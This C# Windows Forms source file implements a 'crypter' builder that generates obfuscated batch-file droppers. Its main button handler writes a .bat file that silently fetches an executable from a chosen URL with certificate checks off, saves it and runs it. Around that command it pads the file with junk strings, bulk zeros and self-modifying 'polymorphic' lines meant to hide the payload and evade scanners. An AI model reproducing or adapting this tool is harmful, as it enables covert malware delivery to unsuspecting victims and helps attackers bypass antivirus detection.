﻿using System;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace SkarCrxpter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        string randomBatchCode = "echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% " +
            "%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%" +
            " %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%" +
            " %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%" +
            " %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% " +
            "%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%" +
            " %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%" +
            " %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random" +
            "% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%" +
            " %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% " +
            "%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% " +
            "%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%" +
            " %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%";


        string clearScreen = "cls";

        string randomHashes = "echo c95df018%%%%a3cgr77g3r7gh3gujhuh56341149f%gr77g3r7gh3gujhuh563%%%dd1ffe6390327975e3" +
            "01a3925b1647a4c3b362051efc2d%%%%gr77g3r7ghrrE6G33N6NS3GB3RGRTGB4T%%%%%%%%%%%%%%%%c95df018a3c4" +
            "1149fdd1ffe6390327975e301a3925b1647a4c3b362051efc2d596f1cbdeebdef1e0f75fb7dd598633640a229e982" +
            "7b16b295e43b2a8bd95693c628d016f8a4f2f73a2c42fc8407da8b980a0b21bb7455d7155bf24a584d6b0b3d7dbea" +
            "1894b6e3d6801dd0e23798023917bfb5ac49f1620e5d4cbd35955630f78619fa6e1be9441c997c1a85cd3b04c1349" +
            "575a83cf4b6f785f316a4d0738%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" +
            "%%%%%%%%%%%%%%%%%%%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&%&%&%&&%&%&%&%&% &g%6G%&g%vb&b &%b" +
            "5z%uZ53gujhuh563596f1gr77g3r7gh3gujhuh563cbd%%%%eebdef1e0f75fb7d" +
            "d598633640a229e9827b%%%%16b295e43b%%%%2a8bd9%%%%gr77g3r7gh3gujhuh563gr77g3r7gh3gujhuh5635693c628d016f8a4" +
            "f2f73a2c42fc8407da8b%%%%980a0b21bb7455d%%%%7155gr77g3r7gh3gujhuh563gr77g3r7gh3gujhuh563bf24a584d6b0b3" +
            "d7dbea1894b6e3d6801%%%%dd0e2%%%%3798023%%%%917bfgr77g3r7gh3gujhuh563gr77g3r7gh3gujhuh563b5ac49f1620e5d4cb" +
            "d3595389HG39GU3BE9UG3BE4356r7gr77g3r7gh3gujhuh5630f78%%%%619f%%%%%%%%a6e1be9441%%%%c997c1a85cd3b04c1349575a83cf" +
            "4%%%%b6f785f%%%%316a4d%%%%0738c2b ";

        string shitCode = "@echo off u3hu35%&gzfegzgfezfziebfezbfziegFZE3GBI3BGI2GBPUGO2NGU2 U ZDB3ZZZUG2B2IZG2 BGZ2BE GZ2B G2Z GB2EIZLB2 GL7B2G2O876GBE28OZGB1 G2BOGZTEV2BGV2GIZ2 BG2BG2G BEZIGB2EZFG B2EKUG B 2ZUGB K2EU 7TBGR2ZGB3UZDBVUH B3RZ3 HFB 3Fç%&/*gr/t*çg/f2 76GE6TG2 E65GTRB3R ZGB3O2LET 3ELVGLRB3EGUR3éHG2G3à'22E'0 T¨G2¨G1 G¨2 àV2hg0";

        string chinees = "@echo off 䀦汣♳獀瑥∠䳃䚧䐽愵啴噃䡘䵂㍙ㄴ歷晎牅⁺杰兤副番告䜶婹猲坩㝣䅨䱓汢䭱浮䥏䁶㡸健〹≆┊䳃䚧縺ㄴㄬ┥䳃䚧縺〳ㄬ┥䳃䚧縺〲ㄬ┥䳃䚧縺㠴ㄬ┥䳃䚧縺㈲ㄬⴥ쌥Ꝍ㩆ㅾⰶ┱쌥Ꝍ㩆㉾ⰲ┱ⴭ쌥Ꝍ㩆㍾ⰸ┱쌥Ꝍ㩆㍾ⰹ┱쌥썹ꅫ旃┥䳃䚧縺㠴ㄬ┥䳃䚧縺㤵ㄬ┥䳃䚧縺ㄵㄬ┥䳃䚧縺ⰳ┱쌥Ꝍ㩆㉾ⰲ┱쌥Ꝍ㩆㑾ⰳ┱쌥Ꝍ㩆㍾ㄬ┥䳃䚧縺ⰳ┱쌥Ꝍ㩆㉾ⰳ┱쌥Ꝍ㩆㍾ⰸ┱⼺术慲晦灳瑯椮普⽯牦浡⹥硥╥䳃䚧縺㈲ㄬⴥ┭䳃䚧縺㜲ㄬ┥䳃䚧縺〳ㄬ┥䳃䚧縺ⰳ┱쌥Ꝍ㩆㉾ⰳ┱쌥Ꝍ㩆㍾ⰰ┱쌥Ꝍ㩆㍾ㄬ┥䳃䚧縺㈲ㄬ┥䳃䚧縺ⰵ┱尺楗摮睯屳䕔偍晜慲敭⹨硥♥䌦尺楗摮睯屳䕔偍晜慲敭⹨硥";

        string symbols = "@echo off ⊂健〹≆┊䳃䚧縺ㄴ☉η⊺健〹≆┊䳃䚧縺ㄴ∑⫯էℏ₥$健〹≆┊䳃䚧縺ㄴ⫒⩔⋿健〹≆┊䳃䚧縺ㄴՒ⟙ι$η健〹" +
            "≆┊䳃䚧縺ㄴ♱⫯էℏ₥$健〹≆┊䳃䚧縺ㄴь⫒⫒健〹≆┊䳃䚧縺ㄴ3G⩔բ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕ⋿Ւ健〹≆┊䳃䚧縺ㄴ⟙ι$健〹≆┊䳃䚧" +
            "縺ㄴ⩔⋿Ւ⟙ι$µէ τ健〹≆┊䳃䚧縺ㄴ⫒⫒⩔⋿55%%%ՒG3G⟙3ι$ℏ∈ ⟑⫒⩔健〹≆┊䳃䚧縺ㄴՒ⫒⩔⋿Ւ健〹≆┊䳃䚧縺ㄴ⟙ι$ℏ∈ ⟑⫒⫒բ𐅾∈ѕ∫ℹ︎縺" +
            "ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕ⩔⋿Ւ⟙ι$⩔⟙ι$ℏ∈ 3⟑⫒⫒3G3⩔⋿Ւ⟙ι$⩔G3G⫒⫒⩔⫒⩔⋿Ւ⟙ι$ℏ∈ ⟑⫒⫒⩔%%%%%%&&&&%⟙ι$ℏ∈ ⟑⫒⫒⩔⋿" +
            "Ւ⟙ι$⩔$⩔⩔⋿Ւ⟙ι$ℏ∈ ⟑⫒⫒⩔⋿Ւ⟙ι$⩔⋿Ւ⟙ι$⫯∏₲ ª₤Ԍº3GЯ⫯3էℏ₥$ ♰ℏºЯ⫯էℏ₥$⫯է⫯էℏ₥$ℏ₥$% ♰ℏ⫯էℏ₥$∀⫯էℏ₥$է ⩋ι∩ºЯ⫯է⫯էℏ₥$" +
            "ℏ₥$ ♰ℏ∀է ⩋ι∩∀ºЯ⫯էℏ₥$ ♰ℏ∀E3Gէ ⩋ι∩է ⩋3EGι∩€G º⨃® ℹ︎%𐅾⩋⟑⟙ιοη ∀𐅾℮ µ3GG∏αВ₤∑ ♱⦿ ©º⋔բ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健〹≆" +
            "∨ϱ∏ℇ$ѕբՒ⋿⫲բ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕ⋿∏∂3G բ𐅾∈Gѕ∫ℹ︎縺3RGㄴь⫒⫒健〹≆∨ϱ%%%∏ℇ$ѕ⟙ℏ€ բ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕ" +
            "∈ѕ∫ℹ︎縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕբ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒3GGG33健〹≆∨ϱ%%%∏3G3ℇ$G3Gѕ₲ բ𐅾∈3G∫G3GGℹ︎縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕ τբ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健" +
            "〹≆∨ϱ∏ℇ$ѕբ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕℏ℮ 3Gբ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健G3ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕª$⟙ ∃⨯բ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒բ𐅾∈ѕ∫ℹ︎" +
            "縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕ健〹3≆∨ϱ∏ℇ$ѕ ºϝ ♰ℏ∑ ∐բ3𐅾∈G∫ℹ︎縺ㄴьG3⫒⫒健〹≆∨ϱ∏ℇբ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕ$ѕηℹ︎¢բ𐅾∈" +
            "ѕ∫ℹ︎G3G縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕοբ𐅾բ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒3〹≆∨ϱ∏ℇ$ѕ∈ѕ∫ℹ︎բ𐅾∈ѕ∫ℹ︎縺ㄴь⫒⫒健〹≆∨ϱ∏ℇ$ѕ縺ㄴь⫒⫒健〹≆∨ϱ∏" +
            "ℇ$ѕძ€ ©₶∀𐅾α⊂է∑® ѕ∃⟙ ♰G⦿ ∫µВ∨℮3G𐅾⟙ ♰₶⋿ ¢ο⫙₥º∂3G3ї៛⫯∁ª⊺їο∏ ο៛ ⦿µՒ ∂ª♰∀. ℇª∁⫲ ∈∏₲լї$⫳ ©⫳∀®∀¢♱ϱՒ ι$ " +
            "⩋α℗♇ϱ⫒ ♰☉ ª լ⫯էℏ₥$ι⊂º∂℮ ⊂⫲αՒ⟑∁τ∃Я∫ ∫օ η⦿ ♰⫯էℏ₥$ℏ լ∈⟙τ€Яѕ αՒϱ їძ⋿∏♱ι©α∟⫯էℏ₥$⟑≞ ρЯοτℇ∁τ$ º∟⫯էℏ₥$" +
            "⟑≞∟⫯էℏ₥$⟑≞ ρЯοτℇ∁τ$ ρЯοτℇ∁τ$⨃® ∫ρ∃∑©⫲ В¥ µ$⫯∩₲ ☉∐Ւ ฿οძι∃$ էο ძ℮⦿β⨗∐∫©∀";

        string obfuscationSymbols = "@echo off %%%&&&%&%%%&%%%%%%%%&&&&&&%&%&%&&&%&%&%&%&%&&5555&&%&%£&£&%£%&£&£££&££" +
            "£%£&££%£&&%%%%%%%%&&&&&&%&%&%&&&%&%&%&%&%&&5555&&%&%£&£&%£%&£&£££&£££%£&££%£&£&£%£&%££££&£&£%£&%£££&%%%%%" +
            "%%%&&&&&&%&%&%&&&%&%&%&%&%&&5555&&%&%£&£&%£%&£&£££&£££%£&££%£&£&£%£&%££££&£&%%%%%&&&&&&&%&%%%%%%%%&&&&&&%" +
            "&%&%&&&%&%&%&%&%&&5555&&%&%£&£&%£%&£&£££&£££%£&££%£&£&£%£&%££££&%%%%%%%&&&%%%%%%%%&&&&&&%&%&%&&&%&%&%&%&%" +
            "&&5555&&%&%£&£&%£%&£&£££&£££%£&££%£&£&£%£&%££££&&&&&%&%&%&&&%&%&%&%&%&&5555&&%&%£&£&%£%&£&£££&£££%£&££%£&£&" +
            "£%£&%££££&%&%&%&&&%&%&%&%&%&&%%%%%%%%&&&&&&%&%&%&&&%&%&%&%&%&&5555&&%&%£&£&%£%&£&£££&£££%£&££%£&£&£%£&%££££" +
            "&&5555&&%&%£&£&%£%&£&£££&£££%£&££%£&£&£%£&%£££&%%%%%%%%&&&&&&%&%&%&&&%&%&%&%&%&&5555&&%&%£&£&%£%&£&£££&£££%£&££%£&£&£%£&%££££&£&£%££%&££&$56$$$66$$$$$%%&&%&%&&%&&%&&%&";



        string randomEscapeCodes = "\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C" +
            "\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45" +
            "\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20" +
            "\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20" +
            "\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73" +
            "\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64" +
            "\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62" +
            "\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C" +
            "\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B" +
            "\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D" +
            "\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L" +
            "\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x1" +
            "4\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22" +
            "\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D" +
            "\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D" +
            "\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62" +
            "\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C" +
            "\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45" +
            "\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20" +
            "\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20" +
            "\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73" +
            "\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64" +
            "\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x6" +
            "2\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C" +
            "\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B" +
            "\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D" +
            "\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L" +
            "\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14" +
            "\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22" +
            "\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D" +
            "\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D" +
            "\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62" +
            "\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C" +
            "\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45" +
            "\x22\x6C\x20\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20" +
            "\x1D\x6B\x20\x1D\x1D\x73\x62\x6L\x64\x6C\x14\x62\x45\x22\x6C\x20\x1D\x6B\x20" +
            "\x1D\x1D\x73\x62\x6L\x64\x6C\x14";

        string bytes = "echo 01010001010111010101010100010101001010001010111010101010100010101010" +
            "101010001000101010100010101110101010101000101010101010100010001010101110101000101" +
            "011010100010001001010111110110101010101110101010000101010101011101010001010110101" +
            "000100010010101111101101010101011101010100001010101101010100010001010101110101000" +
            "10101101010001000100101011111011010101010111010101000010101010101000101011101010101" +
            "0100010101010101010001000101010111010100010101101010001000100101011111011010101010" +
            "1110101010000101010101010001010111010101010100010101010101010001000101010111010100" +
            "0101011010100010001001010111110110101010101110101010000101010101010001010111010101" +
            "01010001010101010101000100010101011101001010101010100101010100010101010101001010101" +
            "0101000101011010100010001001010111110110101010" +
            "1011101010100001010101010100010101110101010101000101010101010100010001010101110101" +
            "0001010110101000100010010101111101101010101011101010100001010101010100010101110101" +
            "0101010001010101010101000100010101011101010001010110101000100010010101111101101010" +
            "101011101010100001010101";

        string hellaZeros = "echo 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        // randomEscapeCodes obfuscationSymbols symbols chinees shitCode randomHashes randomBatchCode bytes

        private void button1_Click(object sender, EventArgs e)
        {
            string userInput = DownloadUrl.Text; // the download url
            string installPath = comboBox1.Text; // the install path
            string installName = installNameText.Text; // the install name
            int customSize = (int)numericUpDown1.Value; // custom size

            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Batch Files (*.bat)|*.bat";
                saveFileDialog.Title = "Save";
                saveFileDialog.FileName = "build.bat";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        string fullPath = saveFileDialog.FileName;

                        using (StreamWriter writer = new StreamWriter(fullPath))
                        {
                            if (checkBoxObfuscate.Checked)
                            {
                                if (zeroBomb1.Checked)
                                {
                                    int x = 10000;
                                    for (int i = 0; i < x; i++)
                                    {
                                        writer.WriteLine(hellaZeros);

                                    }
                                }
                                writer.WriteLine(randomEscapeCodes);
                                writer.WriteLine(symbols);
                                writer.WriteLine(chinees);
                                writer.WriteLine(shitCode);
                                writer.WriteLine(randomBatchCode);
                                writer.WriteLine(bytes);
                                writer.WriteLine(bytes);
                                writer.WriteLine(bytes);
                                writer.WriteLine(bytes);
                                writer.WriteLine(bytes);

                                for (int i = 0; i < customSize; i++)
                                {
                                    writer.WriteLine(bytes);

                                }

                                writer.WriteLine(clearScreen);
                                writer.WriteLine("@echo off&&curl -k --silent " + userInput + " --output " + installPath + installName + ".exe" + "&&" + installPath + installName + ".exe");
                                writer.WriteLine(clearScreen);

                                if (zeroBomb1.Checked)
                                {
                                    int x = 100;
                                    for (int i = 0; i < x; i++)
                                    {
                                        writer.WriteLine(hellaZeros);

                                    }
                                }
    
                                if (checkBox1.Checked)//polymorphic
                                {
                                    writer.WriteLine("echo %random%");
                                    writer.WriteLine("echo echo %random% >> %~f0");
                                }

                            }

                            else
                            {
                                if (zeroBomb1.Checked)
                                {
                                    int x = 10000;
                                    for (int i = 0; i < x; i++)
                                    {
                                        writer.WriteLine(hellaZeros);

                                    }
                                }
                                for (int i = 0; i < customSize; i++)
                                {
                                    writer.WriteLine(bytes);

                                }
                                if (zeroBomb1.Checked)
                                {
                                    int x = 100;
                                    for (int i = 0; i < x; i++)
                                    {
                                        writer.WriteLine(hellaZeros);

                                    }
                                }
                                writer.WriteLine("@echo off&&curl -k --silent " + userInput + " --output " + installPath + installName + ".exe" + "&&" + installPath + installName + ".exe");

                                if (checkBox1.Checked)//polymorphic
                                {
                                    writer.WriteLine("echo %random%");
                                    writer.WriteLine("echo echo %random% >> %~f0");
                                }
                            }

                        }


                        MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    catch (Exception ex)

                    {
                        MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }

            }

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}